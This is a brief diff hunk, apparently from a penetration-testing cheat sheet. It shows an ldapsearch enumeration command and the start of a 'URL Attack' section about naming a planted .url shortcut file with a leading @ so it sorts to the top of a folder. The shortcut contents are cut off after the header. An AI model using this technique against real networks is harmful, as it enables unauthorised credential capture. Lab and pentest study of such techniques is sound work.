@@ -89,7 +89,7 @@ ldapsearch -x -h $(cat ip) -p 389 -D  'user' -w 'pass' -b "dc=box,dc=local" -s s
 ```
 
 #### URL Attack
-> Save file @generalfile.url
+> Save file @generalfile.url [The @ places at top of folder]
 
 ```
 [InternetShortcut]
